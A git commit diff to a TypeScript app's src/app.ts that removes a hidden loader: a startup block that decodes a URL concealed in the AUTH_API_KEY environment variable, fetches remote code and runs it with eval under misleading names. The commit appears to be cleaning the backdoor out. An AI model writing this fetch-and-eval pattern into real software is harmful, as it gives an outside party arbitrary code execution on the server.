3ddb1857eec68ecc7e0898c694c75c4c20e1d0c3
Din Islam Rajin <85832724+rajin572@users.noreply.github.com>
2026-07-04 16:53:39 +0600

    Update app.ts

--- src/app.ts
+++ src/app.ts
@@ -10,19 +10,6 @@ import contactRoutes from "./modules/contact/contact.routes";
 import couponsRoutes from "./modules/coupons/coupons.routes";
 import 'dotenv/config';
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
 const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS ?? "")
   .split(",")
   .map((o) => o.trim())
